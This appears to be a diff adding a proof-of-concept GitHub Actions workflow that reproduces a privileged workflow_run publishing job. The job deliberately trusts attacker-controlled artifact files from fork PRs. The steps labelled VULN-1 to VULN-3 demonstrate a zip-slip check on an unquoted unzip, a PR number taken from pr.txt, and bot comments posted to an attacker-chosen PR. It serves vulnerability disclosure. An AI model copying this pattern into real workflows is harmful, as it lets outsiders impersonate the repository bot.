@@ -1,0 +1,113 @@
+name: POC Documentation Publish
+
+# 模拟 docpublish.yml 的角色：workflow_run 触发，在特权上下文中处理 PR artifact
+# 关键：此 workflow 以主仓库 context 运行，持有 pull-requests: write token
+on:
+  workflow_run:
+    workflows: ["POC Documentation Build"]
+    types: [completed]
+
+permissions:
+  contents: read
+  pull-requests: write   # ← 特权：可向任意 PR 写评论
+
+jobs:
+  publish:
+    runs-on: ubuntu-latest
+    if: github.event.workflow_run.conclusion == 'success'
+    steps:
+      - name: "[INFO] Show triggering workflow context"
+        run: |
+          echo "=== workflow_run context ==="
+          echo "Triggered by workflow: ${{ github.event.workflow_run.name }}"
+          echo "Triggering event: ${{ github.event.workflow_run.event }}"
+          echo "Actual PR number (from GitHub API): ${{ github.event.workflow_run.pull_requests[0].number }}"
+          echo "Head repo: ${{ github.event.workflow_run.head_repository.full_name }}"
+          echo "Head SHA: ${{ github.event.workflow_run.head_sha }}"
+          echo "This workflow runs in MAIN REPO context even for fork PRs"
+
+      - name: Download artifacts from PR build
+        uses: dawidd6/action-download-artifact@bf251b5aa9c2f7eeb574a96ee720e24f801b7c11 # v6
+        with:
+          workflow: poc-docbuild.yml
+          run_id: ${{ github.event.workflow_run.id }}
+          github_token: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: "[INFO] Artifact contents (attacker-controlled)"
+        run: |
+          echo "=== Downloaded artifact structure ==="
+          find docs -type f
+          echo ""
+          echo "=== monitor file (controls OUTDIR) ==="
+          cat docs/monitor_*.txt
+          echo ""
+          echo "=== pr.txt (controls which PR receives bot comment) ==="
+          cat docs/pr.txt
+          echo ""
+          echo "=== comment.txt (bot comment body, attacker-controlled) ==="
+          cat docs/comment.txt
+
+      - name: "[VULN-1] Unsafe unzip — verbatim from docpublish.yml L27-31"
+        working-directory: docs
+        run: |
+          # === 漏洞原文（docpublish.yml L27-31）===
+          OUTDIR=ncs/$(awk 'NR==1 { if ($3 ~ /^(latest|PR-[0-9]+|[0-9]+\.[0-9a-zA-Z\.\-]+)$/) print $3 }' monitor_*.txt)
+          mkdir -p "$OUTDIR"
+          echo "OUTDIR=$OUTDIR" >> "$GITHUB_ENV"
+
+          echo ""
+          echo "=== OUTDIR resolved to: [$OUTDIR] ==="
+          echo "=== Working dir before unzip: $(pwd) ==="
+          echo "=== Files before unzip ==="
+          ls -la
+
+          echo ""
+          echo "=== Running: unzip legacy-ncs*.zip -d \$OUTDIR (unquoted, verbatim) ==="
+          unzip legacy-ncs*.zip -d $OUTDIR || true
+
+          echo ""
+          echo "=== Files in docs/ after unzip ==="
+          ls -la
+
+          echo ""
+          echo "=== ZIP-SLIP CHECK: looking for zipslip_pwned.txt outside OUTDIR ==="
+          if [ -f "zipslip_pwned.txt" ]; then
+            echo "🔴 ZIP-SLIP CONFIRMED: file written to docs/zipslip_pwned.txt (outside docs/ncs/PR-999)"
+            cat zipslip_pwned.txt
+          else
+            echo "⚠️  unzip blocked traversal on this platform (InfoZIP >=6.0 strips '..' by default)"
+            echo "    However the attack surface still exists — see VULN-2 and VULN-3 below"
+          fi
+
+      - name: "[VULN-2] PR number from attacker-controlled pr.txt"
+        working-directory: docs
+        run: |
+          # docpublish.yml L37: PR=$(head -n 1 pr.txt | tr -cd '0-9')
+          PR=$(head -n 1 pr.txt | tr -cd '0-9')
+          echo "PR=$PR" >> "$GITHUB_ENV"
+
+          echo ""
+          echo "=== TRUST BOUNDARY VIOLATION ==="
+          echo "Real PR (from GitHub API) : ${{ github.event.workflow_run.pull_requests[0].number }}"
+          echo "Attacker-set PR (pr.txt)  : $PR"
+          echo ""
+          echo "github-actions[bot] will now post to PR #$PR — NOT the real triggering PR"
+          echo "Attacker can set this to ANY PR number in the repository"
+
+      - name: Find existing bot comment on target PR
+        uses: peter-evans/find-comment@3eae4d37986fb5a8592848f6a574fdf654e61f9e # v3
+        if: env.PR != ''
+        id: fc
+        with:
+          issue-number: ${{ env.PR }}
+          comment-author: 'github-actions[bot]'
+          body-includes: Security PoC
+
+      - name: "[VULN-3] Post bot comment to attacker-chosen PR (impersonation)"
+        if: env.PR != ''
+        uses: peter-evans/create-or-update-comment@71345be0265236311c031f5c7866368bd1eff043 # v4
+        with:
+          comment-id: ${{ steps.fc.outputs.comment-id }}
+          issue-number: ${{ env.PR }}      # ← 来自 pr.txt，攻击者完全控制
+          body-path: docs/comment.txt      # ← 来自 artifact，攻击者完全控制
+          edit-mode: replace
